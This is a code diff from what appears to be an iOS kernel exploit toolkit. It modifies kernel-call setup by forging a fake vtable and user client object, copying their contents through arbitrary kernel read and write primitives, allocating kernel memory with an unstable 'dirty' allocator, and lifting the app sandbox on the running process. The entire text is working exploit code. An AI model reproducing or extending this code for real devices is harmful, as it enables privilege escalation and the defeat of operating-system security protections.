@@ -426,13 +426,22 @@ uint64_t init_kcall(void) {
     uint64_t uc_addr = kread64(uc_port + off_ipc_port_ip_kobject);    //#define IPC_PORT_IP_KOBJECT_OFF
     uint64_t uc_vtab = kread64(uc_addr);
     
-    if(_fake_vtable == 0) _fake_vtable = off_empty_kdata_page + get_kslide();
+    if(off_p_ucred == 0) {
+        if(_fake_vtable == 0) _fake_vtable = mineek_dirty_kalloc(0x1000);
+    } else {
+        if(_fake_vtable == 0) _fake_vtable = off_empty_kdata_page + get_kslide();
+    }
     
     for (int i = 0; i < 0x200; i++) {
         kwrite64(_fake_vtable+i*8, kread64(uc_vtab+i*8));
     }
     
-    if(_fake_client == 0) _fake_client = off_empty_kdata_page + get_kslide() + 0x1000;
+    if(off_p_ucred == 0) {
+        if(_fake_client == 0) _fake_client = mineek_dirty_kalloc(0x2000);
+    } else {
+        if(_fake_client == 0) _fake_client = off_empty_kdata_page + get_kslide() + 0x1000;
+    }
+    
     
     for (int i = 0; i < 0x200; i++) {
         kwrite64(_fake_client+i*8, kread64(uc_addr+i*8));
@@ -528,7 +537,29 @@ int prepare_kcall(void) {
     return 0;
 }
 
-int unsandbox_stage2(void) {
+int kalloc_using_empty_kdata_page_stage2(void) {
+
+    //init_kcall();
+
+    uint64_t allocated_kmem[2] = {0, 0};
+    allocated_kmem[0] = kalloc(0x1000);
+    allocated_kmem[1] = kalloc(0x2000);
+
+    IOServiceClose(_user_client);
+    _user_client = 0;
+    usleep(10000);
+
+    clean_dirty_kalloc(_fake_vtable, 0x1000);
+    clean_dirty_kalloc(_fake_client, 0x2000);
+    
+    _fake_vtable = allocated_kmem[0];
+    _fake_client = allocated_kmem[1];
+    printf("fake_vtable: 0x%llx, fake_client: 0x%llx\n", _fake_vtable, _fake_client);
+
+    return 0;
+}
+
+int prepare_kcall_stage2(void) {
     NSString* save_path = @"/tmp/kfd-arm64.plist";
     if(access(save_path.UTF8String, F_OK) == 0) {
         uint64_t sb = unsandbox(getpid());
@@ -537,7 +568,7 @@ int unsandbox_stage2(void) {
         _fake_client = [dict[@"kcall_fake_client_allocations"] unsignedLongLongValue];
         sandbox(getpid(), sb);
     } else {
-        kalloc_using_empty_kdata_page();
+        kalloc_using_empty_kdata_page_stage2();
         //Once if you successfully get kalloc to use fake_vtable and fake_client,
         //DO NOT use dirty_kalloc again since unstable method.
         
@@ -554,7 +585,7 @@ int unsandbox_stage2(void) {
         printf("fake_vtable: 0x%llx, fake_client: 0x%llx\n", _fake_vtable, _fake_client);
     }
     
-    init_kcall();
+    //init_kcall();
     
     return 0;
 }
